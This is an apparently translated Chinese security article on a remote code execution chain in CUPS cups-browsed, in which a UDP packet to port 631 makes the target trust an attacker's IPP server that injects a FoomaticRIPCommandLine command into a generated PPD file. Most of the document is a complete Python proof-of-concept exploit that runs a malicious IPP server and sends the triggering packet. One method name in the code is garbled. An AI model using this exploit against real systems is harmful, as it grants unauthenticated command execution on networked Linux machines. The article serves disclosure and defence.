#  Cups 浏览的远程代码执行漏洞   
 Ots安全   2024-09-28 11:30  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
这个通过 cups-browsed 的旧版 CUPS 浏览进行的 DoS 攻击可以通过与此公告相同的方法进行修复（停止/禁用 cups-browsed，关闭或删除 cups-browsed 中的旧版 CUPS 支持），因此我为其分配了相同的 CVE，因为两者都可以通过相同的操作来处理。  
  
**概括**  
  
由于服务绑定到 *:631 ( INADDR_ANY )，cups-browsed 中的多个错误可被依次利用，从而将恶意打印机引入系统。当打印作业启动时，这一系列漏洞最终使攻击者能够在目标机器上远程执行任意命令，而无需身份验证。对网络构成重大安全风险。值得注意的是，此漏洞尤其令人担忧，因为它可以从公共互联网被利用，如果启用了 CUPS 服务，则可能使大量系统暴露于远程攻击。  
  
通过将 UDP 数据包发送到面向公众的 IP 地址来获取内核版本泄漏 PoC：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafXXKbiciaGOY4vsrZ5icgK74mwSRtibhuichjVNoRNEllaKvozX0nA4peSS2YzzrIlB8LOIG6LsFtEKoQ/640?wx_fmt=png&from=appmsg "")  
  
cups-browsed 2.0.1完整的远程代码执行视频Ubuntu 24.04.1 LTS（我添加了PPD内容的调试日志）：  
  
  
**细节**  
  
错误：  
- cups-browsed 在 *:631 上绑定并信任任何来源  
  
- libcupsfilters -> cupsfilters/ipp.c -> cfGetPrinterAttributes5：没有清理打印机返回的 IPP 属性。  
  
- libppd -> ppd/ppd-generator.c > ppdCreatePPDFromIPP2：创建 PPD 缓冲区时不清理属性。  
  
- cups-filters -> filter/foomatic-rip/foomaticrip.c：允许通过 FoomaticRIPCommandLine 执行任何命令。  
  
cups-browsed绑定到 INADDR_ANY:631，允许任何人向其发送 UDP 数据报。此外，大多数 GNU/Linux 发行版上的默认配置非常宽松，允许此 PoC 的特定 UDP 数据包。具体来说，这已针对 进行了测试Ubuntu 24.04.1 LTS。  
  
**步骤 1：**  
  
攻击者启动恶意 IPP 服务器，然后向目标机器发送第一个 UDP 数据包：  
  
```
0 3 http://<ATACKER-IP>:<PORT>/printers/whatever
```  
  
  
这将使目标机器重新连接（并在 User-Agent 标头中泄露内核和 CUPS 版本）到攻击者控制的 IPP 服务器。  
  
**第 2 步：**  
  
这会导致受害者的计算机连接到攻击者控制的 IPP 服务器并请求其属性。除了用于注入的最后一个属性外，服务器还会响应有效属性列表（与其他漏洞类似）：  
  
```
# ... other valid attributes ...
(
    SectionEnum.printer,
    b'printer-privacy-policy-uri',
    TagEnum.uri
): [b'https://www.google.com/"\n*FoomaticRIPCommandLine: "' +
    self.command.encode() +
    b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],
```  
  
  
这将：  
- 将自定义 PPD 指令的双引号+换行符注入到临时 PPD 文件中。（错误：属性中的字符串应该被转义）  
  
- 绕过这些检查。（错误：冒号前添加的空格足以绕过基于 strncmp 的检查）  
  
产生以下 PPD：  
  
```
...
*cupsSNMPSupplies: False
*cupsLanguages: "en"
*cupsPrivacyURI: "https://www.google.com/"
*FoomaticRIPCommandLine: "echo 1 > /tmp/I_AM_VULNERABLE"
*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"
*cupsSingleFile: True
*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 -"
...
```  
  
  
当打印作业发送到假打印机时，此 PPD 将导致echo 1 > /tmp/I_AM_VULNERABLE命令在目标机器上执行。发生这种情况是因为foomatic-rip过滤器将从PPD插入并执行。FoomaticRIPCommandLine  
  
**概念证明**  
  
使用ippserver 包，以 身份运行，将在启动打印作业时在目标机器上exploit.py ATTACKER_EXTERNAL_IP TARGET_IP创建文件：/tmp/I_AM_VULNERABLE  
  
```
#!/usr/bin/env python3
import socket
import threading
import time
import sys


from ippserver.server import IPPServer
import ippserver.behaviour as behaviour
from ippserver.server import IPPRequestHandler
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest


class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [b'Main Printer'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Main Printer Info'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [b'HP 0.00'],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()], # XXX 3 is idle
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1'],
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job, # (required by cups)
                    OperationEnum.validate_job, # (required by cups)
                    OperationEnum.cancel_job, # (required by cups)
                    OperationEnum.get_job_attributes, # (required by cups)
                    OperationEnum.get_printer_attributes,
                )],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [Integer(666).bytes()],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-privacy-policy-uri',
                TagEnum.uri
            ): [b'https://www.google.com/"\n*FoomaticRIPCommandLine: "' +
                self.command.encode() +
                b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'],

        }
        attr.update(super().minimal_attributes())
        return attr

    def ](self, req, _psfile):
        print("target connected, sending payload ...")
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes)


def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    print("sending udp packet to %s:%d ..." % (ip, port))

    printer_type = 0x00
    printer_state = 0x03
    printer_uri = 'http://%s:%d/printers/NAME' % (
        ipp_server_host, ipp_server_port)
    printer_location = 'Office HQ'
    printer_info = 'Printer'

    message = bytes('%x %x %s "%s" "%s"' %
                    (printer_type,
                     printer_state,
                     printer_uri,
                     printer_location,
                     printer_info), 'UTF-8')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (ip, port))


def wait_until_ctrl_c():
    try:
        while True:
            time.sleep(300)
    except KeyboardInterrupt:
        return


def run_server(server):
    print('malicious ipp server listening on ', server.server_address)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    wait_until_ctrl_c()
    server.shutdown()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("%s <LOCAL_HOST> <TARGET_HOST>" % sys.argv[0])
        quit()

    SERVER_HOST = sys.argv[1]
    SERVER_PORT = 12345

    command = "echo 1 > /tmp/I_AM_VULNERABLE"

    server = IPPServer((SERVER_HOST, SERVER_PORT),
                       IPPRequestHandler, MaliciousPrinter(command))

    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    TARGET_HOST = sys.argv[2]
    TARGET_PORT = 631
    send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT)

    print("wating ...")

    while True:
        time.sleep(1.0)
```  
  
  
然后将打印作业发送到目标机器中的新打印机。  
  
**影响**  
  
以 cups（lp）用户身份执行远程代码。  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
